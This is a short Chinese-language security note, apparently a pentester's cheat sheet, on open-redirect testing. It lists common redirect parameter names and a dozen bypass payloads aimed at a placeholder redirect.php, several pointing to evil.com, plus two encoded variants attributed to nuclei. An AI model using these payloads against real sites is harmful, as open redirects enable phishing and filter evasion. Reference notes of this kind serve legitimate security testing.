---
tags:
  - src
create_time: 2024-05-31 17:14
modified_time: 2024-05-31 17:14
status: complete
---

# url跳转

## url常见跳转参数
- redirect_url
- redirect
- redirect_to
- url
- domain
- link
- linkto
- to
- target
- targets
- jump
- jump_to

## url跳转技巧
- http://xxx.xxx.xxx/redirect.php?url=/www.baidu.com
- http://xxx.xxx.xxx/redirect.php?url=//www.baidu.com
- http://xxx.xxx.xxx/redirect.php?url=///www.baidu.com
- http://xxx.xxx.xxx/redirect.php?url=http://www.baidu.com@www.bilibili.com
- http://xxx.xxx.xxx/redirect.php?url=http://www.baidu.com\www.evil.com
- http://xxx.xxx.xxx/redirect.php?url=http://www.baidu.com?www.evil.com
- http://xxx.xxx.xxx/redirect.php?url=http://www.baidu.com#www.evil.com
- http://xxx.xxx.xxx/redirect.php?url=///www.baidu.com//..
- http://xxx.xxx.xxx/redirect.php?url=www.baidu.com//..
- http://xxx.xxx.xxx/redirect.php?url=http://www.baidu.com\\www.evil.com
- http://xxx.xxx.xxx/redirect.php?url=.evil.com(可能会跳到evil.com)
- http://xxx.xxx.xxx/redirect.php?url=.evil(可能会跳到www.evil.com.evil)

## nuclei中的绕过技巧
- http://xxx.xxx.xxx/%0a/4399.com
- http://xxx.xxx.xxx/%5C%5C4399.com/%252e%252e%252f